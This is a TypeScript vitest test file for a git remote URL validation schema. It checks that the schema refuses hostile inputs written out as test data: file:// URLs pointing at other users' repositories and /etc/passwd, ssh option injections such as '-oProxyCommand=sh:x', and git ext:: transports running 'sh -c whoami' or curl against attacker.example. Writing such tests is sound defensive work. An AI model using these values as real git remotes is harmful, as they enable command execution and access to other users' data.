import { describe, it, expect } from 'vitest';
import { gitRemoteUrlSchema, parseScpLikeGitUrl } from './git-url.js';

const accepts = (v: string): boolean => gitRemoteUrlSchema.safeParse(v).success;

describe('gitRemoteUrlSchema', () => {
  it.each([
    'https://github.com/owner/repo.git',
    'https://gitlab.example.com/group/sub/repo',
    'http://gitea.lan:3000/owner/repo.git',
    'ssh://git@github.com/owner/repo.git',
    'https://user@host/repo.git',
    // scp-style: how almost everyone actually writes an ssh remote.
    'git@github.com:owner/repo.git',
    'git@gitlab.example.com:group/sub/repo.git',
    'git@gitserver:repo.git',
    'github.com:owner/repo.git',
    'git@github.com:/srv/absolute/repo.git',
  ])('accepts %s', (url) => {
    expect(accepts(url)).toBe(true);
  });

  it('refuses a file:// URL', () => {
    // The one that matters. Every account's repositories share one volume, so a
    // file:// remote fetches someone else's work into your own — and no network
    // control sees it happen. MEASURED: `git ls-remote file:///tmp/src` succeeds
    // against any readable repository.
    expect(accepts('file:///var/lib/haive/repos/other-user/other-repo')).toBe(false);
    expect(accepts('file:///etc/passwd')).toBe(false);
    expect(accepts('FILE:///tmp/x')).toBe(false);
  });

  it('refuses an scp-style address that could inject an ssh option', () => {
    // A host beginning with `-` is read as a flag by whatever receives it, which
    // is the classic route from "remote URL" to "arbitrary command".
    expect(accepts('-oProxyCommand=sh:x')).toBe(false);
    expect(accepts('git@-oProxyCommand=sh:x')).toBe(false);
    expect(accepts('--upload-pack=sh:x')).toBe(false);
  });

  it('refuses a colon form that is really a mistyped scheme', () => {
    // Stricter than git, which would treat each of these as a hostname. A real
    // scp address has a user or a dotted host.
    expect(accepts('javascript:alert(1)')).toBe(false);
    expect(accepts('data:text/plain,hi')).toBe(false);
    expect(accepts('file:/tmp/src')).toBe(false);
    expect(accepts('gitserver:repo.git')).toBe(false);
  });

  it('refuses a local path wearing a colon', () => {
    // git resolves `foo/bar:baz` as a local path, not an scp address, because
    // the slash comes first — so it must not pass as a host here either.
    expect(accepts('./repos/mine:x')).toBe(false);
    expect(accepts('/var/lib/haive/repos/other/repo')).toBe(false);
    expect(accepts('/tmp/src')).toBe(false);
  });

  it('refuses git’s command-executing transports', () => {
    // git refuses `ext::` on its own ("transport 'ext' not allowed"), but a
    // property this schema is responsible for must not rest on another tool's
    // default.
    expect(accepts('ext::sh -c whoami')).toBe(false);
    expect(accepts('ext::curl https://attacker.example/x')).toBe(false);
  });

  it.each(['git://host/repo.git', 'ftp://host/repo.git', 'not a url at all', ''])(
    'refuses %s',
    (url) => {
      expect(accepts(url)).toBe(false);
    },
  );

  it('cannot produce a hostless https URL, which is why the host check is for file:', () => {
    // Surprising, and worth recording so nobody deletes the host check as dead:
    // for a SPECIAL scheme the WHATWG parser cannot yield an empty host — it
    // normalises `https:///repo.git` to the host `repo.git`. The check earns its
    // place on the other side, where `file:///path` genuinely parses with no
    // host at all.
    expect(new URL('https:///repo.git').hostname).toBe('repo.git');
    expect(accepts('https:///repo.git')).toBe(true);
    expect(new URL('file:///etc/passwd').hostname).toBe('');
  });

  it('keeps an scp path VERBATIM rather than normalising it to a URL', () => {
    // In scp-style a path with no leading slash is relative to the remote user's
    // HOME; `ssh://host/path` is absolute. Rewriting one into the other would
    // quietly change which repository is meant.
    expect(parseScpLikeGitUrl('git@github.com:owner/repo.git')).toEqual({
      user: 'git',
      host: 'github.com',
      path: 'owner/repo.git',
    });
    expect(parseScpLikeGitUrl('git@host.example:/srv/repo.git')?.path).toBe('/srv/repo.git');
  });

  it('trims surrounding whitespace, which a paste carries in', () => {
    expect(accepts('  https://github.com/owner/repo.git  ')).toBe(true);
  });

  it('bounds the length', () => {
    expect(accepts(`https://host/${'a'.repeat(3000)}`)).toBe(false);
  });
});
